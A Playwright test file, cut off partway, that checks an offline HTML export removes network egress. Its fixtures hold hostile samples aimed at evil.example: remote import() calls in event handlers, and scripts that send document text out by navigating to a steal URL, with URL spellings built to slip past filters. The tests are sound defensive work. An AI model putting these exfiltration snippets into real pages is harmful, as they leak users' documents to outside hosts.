import { test, expect } from "@playwright/test";
import { execFileSync } from "child_process";
import fs from "fs";
import net from "net";
import path from "path";
import zlib from "zlib";
import {
  DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
  installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonShareable,
  clickSidebarExport,
} from "./helpers.js";

const CONTENT = `
<h1>Offline export</h1>
<p id="offline-note">This paragraph proves embedded comments travel in the offline file.</p>
<img id="remoteTracker" alt="Remote tracker" src="https://example.com/tracker.png" srcset="https://example.com/tracker-2x.png 2x">
<link id="remotePreload" rel="preload" as="image" imagesrcset="https://example.com/preload.png 1x" imagesizes="100vw">
<iframe id="remoteFrame" title="Remote frame" src="https://example.com/beacon.html"></iframe>
<pre class="mermaid cm-skip">
flowchart LR
  A[Alpha] --> B[Beta]
</pre>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>
<figure class="chart" aria-labelledby="offline-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="offlineChart" width="360" height="180" role="img" aria-label="Offline export Chart.js bar chart"></canvas>
  </div>
  <figcaption id="offline-chart-cap">Chart.js chart for offline export.</figcaption>
</figure>
<script>
(function () {
  var el = document.getElementById("offlineChart");
  if (!el || typeof Chart === "undefined") return;
  new Chart(el, {
    type: "bar",
    data: {
      labels: ["one", "two", "three"],
      datasets: [{ label: "Values", data: [4, 9, 6], backgroundColor: "#4a7fb5" }]
    },
    options: {
      animation: false,
      responsive: false,
      plugins: { legend: { display: false } },
      scales: { y: { beginAtZero: true } }
    }
  });
})();
</script>
<script type="module">
import "https://example.com/bare-module.js";
</script>`;

async function routeRichContentLocal(page) {
  const mermaidRoot = path.join(DEV, "node_modules", "mermaid");
  const mermaidVersion = JSON.parse(fs.readFileSync(path.join(mermaidRoot, "package.json"), "utf8")).version;
  const chartRoot = path.join(DEV, "node_modules", "chart.js");
  await page.route(/^https?:\/\//, async (route) => {
    const url = route.request().url();
    if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
    const u = new URL(url);
    if (/cdn\.jsdelivr\.net\/npm\/mermaid@/.test(url)) {
      const reqMajor = (u.pathname.match(/mermaid@(\d+)/) || [])[1];
      if (reqMajor && reqMajor !== String(mermaidVersion).split(".")[0]) {
        throw new Error(`mermaid version mismatch: template requests @${reqMajor}, vendored is ${mermaidVersion}`);
      }
      const rel = u.pathname.replace(/^\/npm\/mermaid@[^/]+\//, "");
      try {
        const body = fs.readFileSync(path.join(mermaidRoot, rel));
        return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
      } catch (e) {
        return route.abort();
      }
    }
    if (/cdn\.jsdelivr\.net\/npm\/chart\.js@/.test(url)) {
      const body = fs.readFileSync(path.join(chartRoot, "dist", "chart.umd.js"));
      return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
    }
    return route.abort();
  });
}

function makeTmpDir() {
  const repoRoot = path.resolve(DEV, "..", "..", "..");
  const tmpRoot = path.join(repoRoot, "tmp");
  fs.mkdirSync(tmpRoot, { recursive: true });
  return fs.mkdtempSync(path.join(tmpRoot, "cmh_offline_"));
}

async function installDownloadTextCapture(page) {
  await page.addInitScript(() => {
    window.__cmhDownloadTexts = [];
    const originalCreateObjectURL = URL.createObjectURL.bind(URL);
    URL.createObjectURL = (blob) => {
      if (blob && String(blob.type || "").includes("text/html")) {
        blob.text().then((text) => window.__cmhDownloadTexts.push(text));
      }
      return originalCreateObjectURL(blob);
    };
  });
}

async function capturedDownloadText(page) {
  await page.waitForFunction(() => window.__cmhDownloadTexts && window.__cmhDownloadTexts.length > 0);
  return page.evaluate(() => window.__cmhDownloadTexts[window.__cmhDownloadTexts.length - 1]);
}

function layerDescriptor(html) {
  const m = html.match(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/i);
  if (!m) throw new Error("missing layer descriptor");
  return JSON.parse(m[2]);
}

function realLayerDescriptorScripts(html) {
  const head = html.slice(0, html.indexOf(CONTENT_BEGIN));
  return [...head.matchAll(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/gi)];
}

function insertLayerDecoy(html) {
  const decoy = '<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>';
  const marker = '<script type="application/json" id="commentableHtmlLayer">';
  if (!html.includes(marker)) throw new Error("missing real layer descriptor marker");
  return html.replace(marker, decoy + "\n" + marker);
}

const EXPECTED_LAYER_REGIONS = ["CSS", "HANDLED IDS", "EMBEDDED COMMENTS", "COMMENT UI", "JS"];
const CONTENT_BEGIN = "<!-- BEGIN: commentable-html - CONTENT (agent edits ONLY between these markers) -->";
const CONTENT_END = "<!-- END: commentable-html - CONTENT -->";

function escapeRegExp(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function markerLine(kind, region) {
  return new RegExp(
    `^[ \\t]*(?:<!--[ \\t]*)?(?:/\\*[ \\t]*)?(?:=+[ \\t]*)?${
      escapeRegExp(`${kind}: commentable-html - ${region}`)
    }[ \\t]*(?:=+[ \\t]*)?(?:-->|\\*/)?[ \\t]*$`,
    "gm"
  );
}

function expectForwardCompatibleContract(html, mode) {
  const descriptor = layerDescriptor(html);
  expect(descriptor.mode).toBe(mode);
  expect(descriptor.regions).toEqual(EXPECTED_LAYER_REGIONS);

  let lastBegin = -1;
  for (const region of EXPECTED_LAYER_REGIONS) {
    const begins = [...html.matchAll(markerLine("BEGIN", region))];
    const ends = [...html.matchAll(markerLine("END", region))];
    expect(begins, `BEGIN marker for ${region}`).toHaveLength(1);
    expect(ends, `END marker for ${region}`).toHaveLength(1);
    expect(begins[0].index).toBeLessThan(ends[0].index);
    expect(begins[0].index).toBeGreaterThan(lastBegin);
    lastBegin = begins[0].index;
  }

  const begin = html.indexOf(CONTENT_BEGIN);
  const end = html.indexOf(CONTENT_END);
  expect(begin).toBeGreaterThan(-1);
  expect(end).toBeGreaterThan(begin);
  const beforeContent = html.slice(0, begin);
  const rootMatches = [...beforeContent.matchAll(/<main\b[^>]*\bid=(["'])commentRoot\1[^>]*>/gi)];
  expect(rootMatches).toHaveLength(1);
  expect(rootMatches[0][0]).toContain("data-cmh-content-root");
  expect(html.indexOf("</main>", end)).toBeGreaterThan(end);
}

function mediaLoadAttributes(html) {
  const refs = [];
  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed|track|image|use|input|meta|base|body|table|td|th|form|button)\b[^>]*>/gi;
  for (const tag of html.matchAll(tagRe)) {
    for (const attr of tag[0].matchAll(/\s(href|xlink:href|src|srcset|imagesrcset|imagesizes|poster|data|background|content|action|formaction)\s*=\s*["']([^"']+)["']/gi)) {
      refs.push({ tag: tag[1].toLowerCase(), attr: attr[1].toLowerCase(), value: attr[2] });
    }
  }
  return refs;
}

function networkLoadRefs(html) {
  const refs = [];
  for (const item of mediaLoadAttributes(html)) {
    const values = (item.attr === "srcset" || item.attr === "imagesrcset")
      ? item.value.split(",").map((part) => part.trim().split(/\s+/)[0])
      : [item.value];
    for (const value of values) {
      if (/^(?:https?:)?\/\//i.test(value)) refs.push(value);
    }
  }
  return refs;
}

function cspMetaContent(html) {
  const m = html.match(/<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/i);
  if (!m) return "";
  const c = m[0].match(/\scontent=(["'])([\s\S]*?)\1/i);
  return c ? c[2] : "";
}

test("Export Offline embeds vendored mermaid and Chart.js for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
  test.setTimeout(60000);
  expect(networkLoadRefs(CONTENT)).toEqual(expect.arrayContaining([
    "https://example.com/tracker.png",
    "https://example.com/tracker-2x.png",
    "https://example.com/preload.png",
    "https://example.com/beacon.html",
  ]));
  const staged = stageContent(CONTENT, { key: "cmh-offline-export", source: "offline-export.html" });
  fs.writeFileSync(staged.html, insertLayerDecoy(fs.readFileSync(staged.html, "utf8")));
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await page.waitForFunction(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    await page.keyboard.press("Escape");
    await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
    await expect(page.locator("#btnSidebarExportMenu")).toBeVisible();
    await openSidebarExportMenu(page);
    await expect(page.locator("#btnExportOffline")).toBeVisible();

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expectForwardCompatibleContract(exportedHtml, "offline");
    expect(realLayerDescriptorScripts(exportedHtml)).toHaveLength(1);
    expect(exportedHtml).toContain('<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>');
    expect(exportedHtml).toContain('id="embeddedComments"');
    expect(exportedHtml).toContain('<canvas id="offlineChart"');
    expect(exportedHtml).not.toContain('data-cm-offline-chart="true"');
    expect(exportedHtml).not.toContain('<img id="offlineChart"');
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
    expect(exportedHtml).not.toContain("bare-module.js");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-export.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-live", "polite");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-label", /Offline: self-contained and works with no network/);
    await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");

    const mediaState = await page2.evaluate(() => {
      const img = document.getElementById("remoteTracker");
      const iframe = document.getElementById("remoteFrame");
      return {
        imgSrc: img && img.getAttribute("src"),
        imgSrcset: img && img.getAttribute("srcset"),
        iframeSrc: iframe && iframe.getAttribute("src"),
      };
    });
    expect(mediaState.imgSrc || "").not.toMatch(/^(?:https?:)?\/\//i);
    expect(mediaState.imgSrcset).toBeNull();
    expect(mediaState.iframeSrc).toBeNull();

    const mermaid = page2.locator("#commentRoot pre.mermaid svg").first();
    await expect(mermaid).toBeVisible();
    await page2.locator("#commentRoot pre.mermaid svg g.node").first().hover();
    await expect(page2.locator("#mermaidAddBtn")).toBeVisible();

    const chart = page2.locator("canvas#offlineChart");
    await expect(chart).toBeVisible();
    const chartMetrics = await page2.evaluate(() => {
      const canvas = document.getElementById("offlineChart");
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      if (!canvas || !chart) return null;
      const rect = canvas.getBoundingClientRect();
      const active = [{ datasetIndex: 0, index: 1 }];
      if (chart.setActiveElements) chart.setActiveElements(active);
      if (chart.tooltip && chart.tooltip.setActiveElements) {
        chart.tooltip.setActiveElements(active, {
          x: rect.left + rect.width / 2,
          y: rect.top + 20,
        });
      }
      chart.update("none");
      return {
        width: rect.width,
        height: rect.height,
        tooltipOpacity: chart.tooltip && typeof chart.tooltip.opacity === "number" ? chart.tooltip.opacity : 0,
        datasets: chart.data && chart.data.datasets ? chart.data.datasets.length : 0,
        chartAreaWidth: chart.chartArea ? chart.chartArea.right - chart.chartArea.left : 0,
      };
    });
    expect(chartMetrics).toBeTruthy();
    expect(chartMetrics.datasets).toBe(1);
    expect(chartMetrics.width).toBeGreaterThan(20);
    expect(chartMetrics.height).toBeGreaterThan(20);
    expect(chartMetrics.chartAreaWidth).toBeGreaterThan(20);
    expect(chartMetrics.tooltipOpacity).toBeGreaterThan(0);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline embeds the MIT license notice beside each inlined library (CMH-LICENSE-02)", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-notice", source: "offline-notice.html" });
  // Seed a STALE library notice into the document head on disk (as a hypothetical earlier offline
  // pass would leave). The offline export's base HTML carries it, so this exercises the idempotency
  // strip: _stripOfflineRichRenderers must drop the stale notice before the export re-emits one.
  const staleNotice = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nSTALE DUPLICATE\n-->";
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace("</head>", staleNotice + "\n</head>"));
  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "notice check");
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    // Both libraries are inlined for this doc, so both MIT notices must travel with them, each inside
    // an HTML comment (a notice, not executable content) that carries the verbatim upstream copyright.
    const comments = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    const mermaidNotice = comments.find((c) => c.includes("Third-party notice - mermaid"));
    const chartNotice = comments.find((c) => c.includes("Third-party notice - Chart.js"));
    expect(mermaidNotice, "mermaid MIT notice comment").toBeTruthy();
    expect(chartNotice, "Chart.js MIT notice comment").toBeTruthy();
    expect(mermaidNotice).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(mermaidNotice).toContain("Permission is hereby granted");
    expect(chartNotice).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(chartNotice).toContain("Permission is hereby granted");
    // Idempotent: exactly one notice per library - the seeded stale mermaid notice was stripped and
    // re-emitted once, never duplicated.
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    expect(exportedHtml).not.toContain("STALE DUPLICATE");
    // The notice is a comment, never an executed script, so it cannot run and stays under the CSP.
    expect(exportedHtml).not.toContain("Third-party notice - mermaid is bundled inline for offline use under the MIT License:</script>");
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("editing an already-offline document preserves offline mode and offline export is idempotent (CMH-OFFLINE-03)", async ({ page }) => {
  const offlineContent = `
<h1>Already offline</h1>
<p id="offline-preserve-note">Offline files can still collect review notes.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip">
    <img id="offlinePreservedChart" class="cmh-chart" data-cm-offline-chart="true"
      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/l1pK4wAAAABJRU5ErkJggg=="
      alt="Offline chart snapshot" width="1" height="1">
  </div>
  <figcaption>Offline chart snapshot.</figcaption>
</figure>`;
  const staged = stageContent(offlineContent, { key: "cmh-offline-preserve", source: "offline-preserve.html" });
  const html = fs.readFileSync(staged.html, "utf8")
    .replace('"mode":"shareable"', '"mode":"offline"', 1);
  fs.writeFileSync(staged.html, html);
  try {
    await installClipboardCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
    await addTextComment(page, "#offline-preserve-note", "preserve this offline note");

    const [shareableDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnSaveHtml"),
    ]);
    const shareableHtml = await readDownload(shareableDownload);
    expect(layerDescriptor(shareableHtml).mode).toBe("offline");
    expect(shareableHtml).toContain("preserve this offline note");
    expect(shareableHtml).toContain('data-cm-offline-chart="true"');
    expect(mediaLoadAttributes(shareableHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(shareableHtml)).toEqual([]);

    const [offlineDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const offlineHtml = await readDownload(offlineDownload);
    expect(layerDescriptor(offlineHtml).mode).toBe("offline");
    expect((offlineHtml.match(/data-cm-offline-chart="true"/g) || []).length).toBe(1);
    expect(mediaLoadAttributes(offlineHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(offlineHtml)).toEqual([]);
    expect(offlineHtml).not.toContain('<canvas id="offlinePreservedChart"');
    expect(offlineHtml).toContain("preserve this offline note");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and event-handler egress (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_EGRESS = `
<h1>Offline zero network</h1>
<style>
@import "https://evil.example/imported.css";
@import "https:evil.example/scheme-only-imported.css";
@import"https://evil.example/nospace-imported.css";
@import "https://evil.example/media-imported.css" screen;
.remote-bg { background-image: url("//evil.example/bg.png"); }
.scheme-only-bg { background-image: url(https:evil.example/scheme-only-bg.png); }
.quoted-paren-bg { background-image: url("https:evil.example/paren)bg.png"); }
</style>
<link rel="prefetch" href="https://evil.example/prefetch.js">
<link rel="prerender" href="https://evil.example/prerender.html">
<meta http-equiv="refresh" content="9999; url=https://evil.example/refresh">
<p id="egress-note">Offline export must strip every load vector.</p>
<img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
<img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
<svg width="20" height="20" aria-label="foreign handler probe"><rect id="foreignHandlerProbe" width="20" height="20" onload="import('https://evil.example/foreign-handler.js')"/></svg>
<noscript><button id="noscriptHandlerProbe" onclick="import('https://evil.example/noscript-handler.js')">go</button></noscript>
<noscript><style id="noscriptStyleProbe">@import "https://evil.example/noscript-imported.css";
.noscript-bg { background-image: url("//evil.example/noscript-bg.png"); }</style>
<div id="noscriptInlineStyleProbe" style="background-image:url('https:evil.example/noscript-inline.png')">fallback</div></noscript>
<svg width="20" height="20" aria-label="remote svg refs">
  <image href="https://evil.example/vector.png" width="20" height="20"></image>
  <use href="https://evil.example/sprite.svg#icon"></use>
  <image xlink:href="https://evil.example/vector-xlink.png" width="20" height="20"></image>
  <use xlink:href="https://evil.example/sprite-xlink.svg#icon"></use>
</svg>
<video poster="https://evil.example/poster.png"><track src="https://evil.example/captions.vtt"></video>
<video src="https://evil.example/video.mp4"><source src="https://evil.example/video-source.mp4" srcset="https://evil.example/video-2x.png 2x"></video>
<audio src="https://evil.example/audio.mp3"><source src="https://evil.example/audio-source.ogg"></audio>
<input type="image" alt="submit" src="https://evil.example/input.png">
<div background="https://evil.example/background.png">legacy background</div>
<script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
  const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    fs.writeFileSync(path.join(staged.dir, "same-origin.png"), Buffer.from("not a real image"));
    fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(/__SAME_ORIGIN__/g, server.url));
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    const csp = cspMetaContent(exportedHtml);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'unsafe-inline'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
    expect(handlerTag && handlerTag[0]).toBeTruthy();
    expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
    // The two shapes only a DOM WALK reaches: a self-closed FOREIGN element, and an element inside
    // a <noscript> body (markup to the DOMParser the export re-parses with, since scripting is off
    // there). The strict validator reads both off its egress tag index, so the export and the gate
    // it is measured by have to agree about them (CMH-OFFLINE-05).
    const foreignHandlerTag = exportedHtml.match(/<rect\b[^>]*id="foreignHandlerProbe"[^>]*>/i);
    expect(foreignHandlerTag && foreignHandlerTag[0]).toBeTruthy();
    expect(foreignHandlerTag[0]).not.toMatch(/\sonload\s*=/i);
    const noscriptHandlerTag = exportedHtml.match(/<button\b[^>]*id="noscriptHandlerProbe"[^>]*>/i);
    expect(noscriptHandlerTag && noscriptHandlerTag[0]).toBeTruthy();
    expect(noscriptHandlerTag[0]).not.toMatch(/\sonclick\s*=/i);
    // The CSS inside that same fallback body: a `<style>` block and a `style=` attribute a
    // scripting-disabled reader really does fetch. The strict validator reads both off the
    // fallback view, so the export has to scrub them for the gate and the exporter to agree
    // (CMH-OFFLINE-05); asserting it here is what keeps the gate from rejecting a file the
    // export just produced.
    expect(exportedHtml).not.toMatch(/noscript-imported\.css|noscript-bg\.png|noscript-inline\.png/i);
    const noscriptStyleTag = exportedHtml.match(/<style\b[^>]*id="noscriptStyleProbe"[^>]*>/i);
    expect(noscriptStyleTag && noscriptStyleTag[0]).toBeTruthy();
    const noscriptInlineStyleTag =
      exportedHtml.match(/<div\b[^>]*id="noscriptInlineStyleProbe"[^>]*>/i);
    expect(noscriptInlineStyleTag && noscriptInlineStyleTag[0]).toBeTruthy();
    // The strip NEUTRALIZES a network `url(...)` to `url("data:,")` rather than deleting the
    // declaration, so assert no NETWORK url remains - not that no `url(` does. The slash run after
    // the scheme is optional here for the same reason the gate stopped requiring it (#961): a
    // scheme-only `url(https:host/x.png)` resolves to the same host.
    expect(noscriptInlineStyleTag[0]).not.toMatch(/url\(\s*(?:&quot;|&#39;|["'])?\s*(?:https?:\/*|\/\/)/i);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
    expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
    expect(exportedHtml).not.toMatch(/<meta\b[^>]*http-equiv=["']refresh/i);
    expect(exportedHtml).not.toMatch(/@import\s/i);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-zero.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline neutralizes form posts and preserves safe canvas scripts (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_FORMS_AND_CANVAS = `
<h1>Offline forms and canvas</h1>
<p id="form-canvas-note">Network form targets must not survive offline export.</p>
<form id="remoteForm" action="https://evil.example/post">
  <button id="remoteButton" formaction="//evil.example/button">Send</button>
  <input id="remoteInput" formaction="https://evil.example/input" value="Send">
</form>
<div class="cm-skip"><canvas id="customCanvas" width="20" height="20" role="img" aria-label="Custom canvas"></canvas></div>
<script>
(function () {
  window.__benignImportCommentKept = true;
  if (false) import("./local-module.js");
  // This comment has slashes but no network dynamic import.
})();
</script>
<script>
(function () {
  var canvas = document.getElementById("customCanvas");
  var ctx = canvas && canvas.getContext("2d");
  if (!ctx) return;
  ctx.fillStyle = "#ff0000";
  ctx.fillRect(0, 0, 20, 20);
  window.__customCanvasDrew = true;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_FORMS_AND_CANVAS, { key: "cmh-offline-forms-canvas", source: "offline-forms-canvas.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    expect(exportedHtml).toContain("window.__benignImportCommentKept = true");
    expect(exportedHtml).toContain("window.__customCanvasDrew = true");
    for (const id of ["remoteForm", "remoteButton", "remoteInput"]) {
      const tag = exportedHtml.match(new RegExp(`<[^>]+id=["']${id}["'][^>]*>`, "i"));
      expect(tag && tag[0]).toBeTruthy();
      expect(tag[0]).not.toMatch(/\s(?:action|formaction)\s*=/i);
    }

    const exportedPath = path.join(outDir, "offline-forms-canvas.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => ({
      importCommentKept: window.__benignImportCommentKept === true,
      customCanvasDrew: window.__customCanvasDrew === true,
      pixel: Array.from(document.getElementById("customCanvas").getContext("2d").getImageData(1, 1, 1, 1).data),
    }));
    expect(state.importCommentKept).toBe(true);
    expect(state.customCanvasDrew).toBe(true);
    expect(state.pixel.slice(0, 3)).toEqual([255, 0, 0]);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("a preserved inline script cannot beacon by navigating the offline file to a remote URL (CMH-OFFLINE-05)", async ({ page, browser }) => {
  // Each smuggled URL spelling is proved against the REAL `validate.py --strict` CLI, and every one
  // of those runs parses a multi-megabyte exported document in a fresh Python subprocess, so the
  // default 30s budget is not enough once the URL literal covers five spellings.
  test.setTimeout(90000);
  // The zero-network CSP blocks every SUBRESOURCE channel but cannot restrict TOP-LEVEL
  // NAVIGATION: `navigate-to` was dropped from CSP Level 3 and ships in no browser, and
  // `sandbox` is ignored when the policy arrives in a <meta>. So a script the export
  // deliberately preserves (CMH-OFFLINE-04) could exfiltrate the whole document - every
  // reviewer comment included - simply by assigning `location.href`. The exporter therefore
  // strips a direct scripted navigation to a network URL the same way it strips a remote
  // dynamic import. The beacon is armed only under `file:` so the SOURCE document, which the
  // exporter reads over http, is not the thing that navigates away.
  const CONTENT_WITH_NAVIGATION = `
<h1>Offline navigation egress</h1>
<p id="nav-note">A preserved inline script must not be able to beacon by navigating away.</p>
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Referrer-Policy" content="unsafe-url">
<a id="docsLink" href="https://docs.example.org/guide" referrerpolicy="unsafe-url">Docs</a>
<script>
(function () {
  window.__cmhExfilRan = true;
  if (location.protocol === "file:") {
    location.href = "https://evil.example/steal?data=" + encodeURIComponent(document.body.innerText);
  }
})();
</script>
<script>
(function () {
  window.__cmhOpenExfilRan = true;
  if (location.protocol === "file:") window.open("https://evil.example/popup");
})();
</script>
<script>
(function () {
  // A prefix CHAIN used to clear the strip - typing "window." in front of the sink is not a
  // meaningful obstacle, so the pattern must follow the whole chain.
  window.__cmhChainExfilRan = true;
  if (location.protocol === "file:") window.top.location.href = "https://evil.example/chain";
})();
</script>
<script>
(function () {
  // A URL literal spelled WITHOUT the slashes after the scheme. A browser resolves
  // "https:evil.example/x" to "https://evil.example/x", so this beacons exactly as well as the
  // direct assignment above while needing no aliasing, no computed access and no obfuscation.
  window.__cmhSchemeOnlyExfilRan = true;
  if (location.protocol === "file:") location.href = "https:evil.example/scheme-only";
})();
</script>
<script>
(function () {
  // A URL the BROWSER NORMALIZES before it resolves it. The leading space is stripped by the URL
  // parser, so this reaches the same host as the unpadded spelling - one keystroke past a scan
  // that reads the literal raw.
  window.__cmhPaddedExfilRan = true;
  if (location.protocol === "file:") location.href = " https://evil.example/padded";
})();
</script>
<script>
(function () {
  // An ASCII tab INSIDE the scheme. The URL parser removes tab, LF and CR from anywhere in its
  // input, and a real tab is legal inside an ordinary string literal.
  window.__cmhTabExfilRan = true;
